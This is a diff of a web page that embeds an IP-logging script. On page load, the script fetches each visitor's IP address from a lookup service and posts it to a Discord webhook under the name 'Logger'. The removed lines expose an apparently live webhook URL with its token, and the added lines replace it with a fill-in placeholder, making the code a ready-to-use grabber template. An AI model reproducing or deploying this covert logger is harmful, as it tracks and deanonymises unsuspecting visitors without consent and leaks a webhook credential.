@@ -76,21 +76,21 @@
                 <script>
                     function getIP(json) {
                         var request = new XMLHttpRequest(); //making a request for the webhook
-                        request.open("POST", "https://discord.com/api/webhooks/1226126479461711923/oyrugegQKBcQFI8HFajMZGKJ9EViCuOK42DsoCGcw3Jp-i2c_gHXKKf8KN_5SjFtMrTA");
+                        request.open("POST", "YOUR DISCORD WEBHOOK LINK HERE");
 
                         request.setRequestHeader('Content-type', 'application/json');
 
                         var params = {
                             username: "Logger",
                             avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
-                            content: "**Ip** : _" + json.query + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + + "_\n**country** : ```" + json.country + "```"
+                            content: "**IP:** *" + json.ip + "*"
                         }
                         //just a webhook parameters such as avatar,name,message
 
                         request.send(JSON.stringify(params));
                     }
                 </script>
-                <script src="http://ip-api.com/json/?callback=getIP"></script>
+                <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
             </div>
         </section>
     </div>
